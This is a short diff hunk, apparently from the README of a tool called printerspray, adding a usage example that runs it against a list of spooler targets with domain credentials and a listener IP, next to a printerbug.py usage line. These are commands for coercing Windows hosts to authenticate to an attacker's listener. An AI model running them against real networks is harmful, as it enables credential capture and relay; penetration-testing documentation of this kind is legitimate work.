@@ -17,4 +17,5 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 Example:
 
 ```
+./printerspray.sh -t ./spooler.txt -d 'labdomain.local' -u 'ADuser1' -p 'pwd' -l 192.168.1.23
 ```
